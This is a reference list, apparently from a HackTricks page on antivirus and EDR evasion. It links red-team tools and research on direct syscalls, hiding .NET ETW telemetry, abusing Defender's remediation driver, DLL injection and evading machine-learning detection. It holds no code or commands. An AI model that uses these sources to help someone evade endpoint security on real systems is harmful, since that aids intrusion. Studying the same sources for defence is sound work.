- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Hiding Your Dotnet Etw](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Abusing Chrome Remote Desktop On Red Team Operations A Practical Guide](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: Weaponizing Defender's Remediation Driver as a Kernel Operation Primitive](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [MDSec Function Peekaboo companion code](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: Crafting Self-Masking Functions Using LLVM](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [TwoSevenOneT - InjectSetConsole source](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn - CreatePipe function](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn - Creating a Child Process with Redirected Input and Output](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
- [44] [Praetorian - GhostPack Necromancy: Reforging C# Tools with WasmForge](https://praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion)
- [45] [WasmForge - Compiling C# / .NET Projects](https://github.com/praetorian-inc/wasmforge/blob/main/docs/CSHARP.md)
- [46] [DLLParty proof-of-concept and source](https://github.com/epersic/DLLParty)
- [47] [DLLParty — Abusing thread pool internals for shellcodeless DLL injection](https://medium.com/@persic.eno/dllparty-abusing-thread-pool-internals-for-shellcodeless-dll-injection-7c84106f7745)
- [48] [EMBER2024 benchmark dataset and thrember tooling](https://github.com/FutureComputing4AI/EMBER2024)
- [49] [Using EMBER2024 to evaluate red team implants](https://mez0.cc/posts/evaluating-implants-with-ember/)
- [50] [MSec Operations – Evading Machine Learning Based Detections](https://msecops.de/blog/posts/ml-evasion/)
- [51] [Kaspersky Securelist – NetamLoader XAML-based .NET loading framework](https://securelist.com/netamloader/121676)
- [52] [Microsoft Learn – AMSI_RESULT enumeration](https://learn.microsoft.com/en-us/windows/win32/api/amsi/ne-amsi-amsi_result)
- [53] [Microsoft Learn – IAntimalware::Scan method](https://learn.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-iantimalware-scan)

{{#include ../banners/hacktricks-training.md}}
